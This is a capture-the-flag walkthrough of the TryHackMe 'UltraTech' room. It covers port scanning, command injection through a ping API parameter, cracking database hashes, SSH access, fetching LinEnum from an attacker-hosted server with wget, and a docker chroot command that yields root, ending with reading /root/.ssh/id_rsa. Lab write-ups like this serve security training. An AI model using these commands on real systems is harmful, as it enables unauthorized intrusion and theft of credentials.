# TryHackMe - UltraTech - Linux

- [Room](https://tryhackme.com/room/ultratech1)

## Nmap

```
┌──(root💀kali)-[~]
└─# nmap -T4 -sC -sV -O -Pn -p- 10.10.12.178 
Nmap scan report for 10.10.12.178
Host is up (0.21s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=5/26%OT=21%CT=1%CU=38541%PV=Y%DS=4%DC=I%G=Y%TM=628F871
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=A)OPS
OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
OS:1NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 817.68 seconds

```

## WFuzz on port 8081

```
┌──(root💀kali)-[~]
└─# wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.10.12.178:8081/FUZZ --hc 404 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.12.178:8081/FUZZ
Total requests: 87664

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================
[STRIPPED]                                                                                                                                                                      
000002579:   200        0 L      8 W        39 Ch       "auth"                                                                                                                                                                      
000003709:   500        10 L     61 W       1094 Ch     "ping"                                                                                                                                                                      
000033607:   500        10 L     61 W       1094 Ch     "Ping"                                                                                                                                                                                                                                                                                                                     
000076294:   200        0 L      8 W        39 Ch       "Auth"                                                                                                                                                                      

Total time: 2554.824
Processed Requests: 87664
Filtered Requests: 87645
Requests/sec.: 34.31311

```

## Task 2

- Which software is using the port 8081? `Node.js`
- Which other non-standard port is used? `31331`
- Which software using this port? `Apache`
- Which GNU/Linux distribution seems to be used? `Ubuntu`
- The software using the port 8081 is a REST api, how many of its routes are used by the web application? (response is find using wfuzz) `2`

## Task 3

- We have an auth endpoint that requires user and password  
![image](https://user-images.githubusercontent.com/96747355/170530482-ec0d415b-ec21-433e-9a2e-24d89037cd1c.png)  
- We also have a ping endpoint but it seems to need a parameter as well  
![image](https://user-images.githubusercontent.com/96747355/170532602-fd12e73d-f7cb-4898-90cf-b1a84cbcb2b6.png)  
- We could try to pass it an ip  
![image](https://user-images.githubusercontent.com/96747355/170533575-1c1167f7-06f0-4515-b75a-ca830a263a78.png)  
- In ctf this kind of features often leads to cmd injection so we could try a command using backticks because it takes precedence over other commands (I tried with pipes and other ways but it did not work) , and it works  
![image](https://user-images.githubusercontent.com/96747355/170534114-51771436-3caa-4c4c-a57b-d15a27060c29.png)  
- Let's try an ls  
![image](https://user-images.githubusercontent.com/96747355/170534235-08511f14-8d51-4b2c-91dd-8a7f22e6b144.png)
- We get the name of the db file!  
![image](https://user-images.githubusercontent.com/96747355/170537550-d8bc90c3-2550-4569-8f64-c39e9a14d12c.png)  
- If we cat the fil we get password hashes for an admin and a user called r00t  
![image](https://user-images.githubusercontent.com/96747355/170538856-4c51f809-8a3e-4f65-b501-9e7456e5e5d6.png)  
- If crack the hash with [crackstation](https://crackstation.net/) we get the password  
![image](https://user-images.githubusercontent.com/96747355/170539323-edab2aff-07e9-4ef3-acbf-3ef11b282664.png)  
- We can do the same for the admin password

### Questions

- There is a database lying around, what is its filename? `utech.db.sqlite`
- What is the first user's password hash? I will let you find it on your own

## About port 31331 - alternative way to foothold

- We could also find things by checking the robots.txt file  
![image](https://user-images.githubusercontent.com/96747355/170544638-7b09c227-c835-4a84-9d0b-8b5d12208697.png)  
- We discover a sitemap  
![image](https://user-images.githubusercontent.com/96747355/170544754-24b4e4a7-281d-4f8f-a572-df8d5d7d058c.png)  
- There is a partner page that we can not find when looking at the website. It is a login page  
![image](https://user-images.githubusercontent.com/96747355/170546439-28e5751c-9f3c-4e0f-97da-61a43d80440c.png)  
- We can check the source code and this way we discover the auth endpoint of the api  
![image](https://user-images.githubusercontent.com/96747355/170548050-bcdae23c-096e-4469-9104-8aed5207e74c.png)
- We can then analyze the code of the api.js file http://10.10.12.178:31331/js/api.js  
![image](https://user-images.githubusercontent.com/96747355/170549692-c0e39354-335a-4d1d-b600-e4965a7f3ea6.png)  
- This way we discover the ping endpoint `http://${getAPIURL()}/ping?ip=${window.location.hostname}`

## Task 4 - Privesc

- Let's try to ssh with the found passwords. It works!  
![image](https://user-images.githubusercontent.com/96747355/170542892-4c9eb306-60a4-4a4a-83d5-840932013862.png)
- Let's enumerate our ways to privesc with [linenum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
- We take it in our attacking machine `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh/`
- We serve it to our target with python server `python3 -m http.server 80`
- We get it to our target `wget http://10.13.22.56/LinEnum.sh`
- We make it executable `chmod +x LinEnum.sh` we have an interesting output here  
![image](https://user-images.githubusercontent.com/96747355/170555950-42058a3c-ce10-4bd5-9f24-05df01739c27.png)  
- Let's have a look at gtfobins and search for docker, we find this(https://gtfobins.github.io/gtfobins/docker/) and we have an interesting command `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` except instead of alpine we want to use bash
- `docker run -v /:/mnt --rm -it bash chroot /mnt sh` and we get root!  
![image](https://user-images.githubusercontent.com/96747355/170556766-6e029343-6c38-455a-942f-c340f3748618.png)
- Let's take the chars of the root ssh key as requested in the question `cat /root/.ssh/id_rsa`

